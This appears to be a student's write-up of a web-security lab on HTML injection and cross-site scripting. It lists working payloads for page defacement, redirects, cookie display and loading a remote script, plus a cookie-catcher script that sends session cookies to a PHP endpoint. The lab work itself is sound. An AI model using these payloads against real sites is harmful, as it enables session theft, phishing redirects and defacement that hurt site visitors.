# XSS

Challenge 1: Site Defacing / HTML Injections

1. Set the background to a different color
2. Display another image on the website
3. Create a link on the website

Challenge 2: JavaScript / Cross Site Scripting

1. Popup: Display a message to the client
2. Redirect the client to some other website
3. Create a session with the server and display the current sesssion ID
4. Try to load JS code from a different web source into the website

Challenge 3: Javascript / Cookie Catcher

1. Write a "Cookie Catcher", Clientside: Javascript, Backend: PHP

## Challenge 1

1. name: `<style>body { background-color: black; }</style>`

    ![image1-1](images/1-1.png)

2. name: `<img src="https://cdn.vox-cdn.com/thumbor/6bvYA8Z7hBRrMJ965Rb20uKB628=/0x0:1192x795/1200x628/filters:focal(596x398:597x399)/cdn.vox-cdn.com/uploads/chorus_asset/file/22312759/rickroll_4k.jpg">`

    ![image1-2](images/1-2.png)

3. name: `<br/><a href="https://www.youtube.com/watch?v=dQw4w9WgXcQ">Click here for free stuff!</a>`

    ![image1-3](images/1-3.png)

    Here, I used `<br/>` to add a newline.

## Challenge 2

1. name: `<script>alert('Hello!');</script>`

    ![image2-1](images/2-1.png)

2. name: `<script>window.location.href = 'https://www.youtube.com/watch?v=dQw4w9WgXcQ';</script>`

3. name: `<script>alert(document.cookie);</script>`
    
    ![image2-3](images/2-3.png)

4. name: `<script src="https://cdn.jsdelivr.net/gh/Moksh45/host-xss.rocks/index.js"></script>`
    
    ![image2-4](images/2-4.png)

## Challenge 3

Install PHP and then run a PHP development server in the HW3 folder using `php -S localhost:8000`.

Then, in the website, write:

name: `<script>var img = new Image(); img.src = 'http://localhost:8000/cookie.php?cookie=' + encodeURIComponent(document.cookie);</script>`

You will receive a request similar to this on your PHP server:

`[Sun Jul  7 15:37:14 2024] 127.0.0.1:48536 [200]: GET /cookie.php?cookie=PHPSESSID%3Duh0o7tbpta72h7am76rssllpae`

And the file `cookies.log` will be created with the cookie.
